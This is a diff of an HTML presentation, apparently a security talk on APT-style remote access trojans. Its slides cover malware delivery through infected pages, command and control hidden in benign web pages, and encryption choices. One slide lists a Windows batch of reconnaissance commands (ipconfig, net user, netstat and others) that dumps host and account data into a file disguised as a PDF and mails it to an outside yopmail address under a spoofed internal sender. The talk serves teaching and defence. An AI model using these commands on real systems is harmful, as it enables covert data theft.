@@ -53,10 +53,10 @@
 					</ul>
 				</section>
 				<section>
-					<img src="resources/spikeGraph.png" style="height:auto; width:auto;"/>
+					<img src="resources/spikeGraph.png" class="stretch"/>
 				</section>
 				<section>
-					<img src="resources/flatgraph.jpg" style="height:auto; width:auto;"/>
+					<img src="resources/flatgraph.jpg" class="stretch"/>
 				</section>
 				<section>
 					<h2>Overview</h2>
@@ -72,34 +72,46 @@
 					MANDIANT report
 					VERIZON report
 
-					---
-					##RAT Design
-
-					- Exe is dropped via infected page
-					- Queries web page for commands
-					- Performs commands if not done previously
-					- Periodically polls for new commands
-
-					---
-					##Encryption
-
-					- Complex Encryption is trivial
-					- PBKDF – Scrypt sequential memory-hard function
-					- Many iterations (> 10K)
-					- Long key-lengths
-
-					---
-					##Encryption Example
-					- Above configuration is custom-hardware resistant
-						- Takes approximately ¼ second per guess
-
-					---
-					##Command/Control
-					- Use Web2C Approach
-						- Commands are “issued” en masse via normal, benign looking web pages
-						- Common ports
-						- Leverages existing HTML/server constructs
-					---
+				</section>
+				<section>
+					<h2>RAT Design</h2>
+					<ul>
+						<li>Exe is dropped via infected page</li>
+						<li>Queries web page for commands</li>
+						<li>Performs commands if not done previously</li>
+						<li>Periodically polls for new commands</li>
+					</ul>
+				</section>
+				<section>
+					<h2>Encryption</h2>
+					<ul>
+						<li>Complex Encryption is trivial</li>
+						<li>PBKDF – Scrypt sequential memory-hard function</li>
+						<li>Many iterations (> 10K)</li>
+						<li>Long key-lengths</li>
+					</ul>
+				</section>
+				<section>
+					<h2>Encryption Example</h2>
+					<ul>
+						<li>Above configuration is custom-hardware resistant</li>
+						<ul>
+							<li>Takes approximately ¼ second per guess</li>
+						</ul>
+					</ul>
+				</section>
+				<section>
+					<h2>Command/Control</h2>
+					<ul>
+						<li>Use Web2C Approach</li>
+						<ul>
+							<li>Commands are “issued” en masse via normal, benign looking web pages</li>
+							<li>Common ports</li>
+							<li>Leverages existing HTML/server constructs</li>
+						</ul>
+					</ul>
+				</section>
+				<section>
 					webpage pic
 					---
 					viewstate pic
@@ -107,22 +119,29 @@
 					viewstate 01
 
 					viewstate 02
-					---
-					##Command Text
-					ipconfig /all > %APPDATA%\info.txt
-					net start >> %APPDATA%\info.txt
-					tasklist /v >> %APPDATA%\info.txt
-					net user >> %APPDATA%\info.txt
-					net localgroup administrators >> %APPDATA%\info.txt
-					netstat -ano >> %APPDATA%\info.txt
-					net use >> %APPDATA%\info.txt
-					copy %APPDATA%\info.txt %APPDATA%\output.pdf
-					del %APPDATA%\info.txt
+				</section>
+				<section>
+					<h2>Command Text</h2>
+					<pre>
+						<code data-trim>
+ipconfig /all > %APPDATA%\info.txt
+net start >> %APPDATA%\info.txt
+tasklist /v >> %APPDATA%\info.txt
+net user >> %APPDATA%\info.txt
+net localgroup administrators >> %APPDATA%\info.txt
+netstat -ano >> %APPDATA%\info.txt
+net use >> %APPDATA%\info.txt
+copy %APPDATA%\info.txt %APPDATA%\output.pdf
+del %APPDATA%\info.txt
 
-					sendmail %APPDATA%\output.pdf Status Update “Jones, William E. wejones@yourorg.gov” itebaffe-836@yopmail.com smtp.yourorg.gov
+sendmail %APPDATA%\output.pdf Status Update “Jones, William E. wejones@yourorg.gov” 
+	itebaffe-836@yopmail.com smtp.yourorg.gov
 
-					del %APPDATA%\output.pdf
-
+del %APPDATA%\output.pdf
+						</code>
+					</pre>
+				</section>
+				<section>
 					---
 					##Mimic User Behavior
 					- Traffic Rates
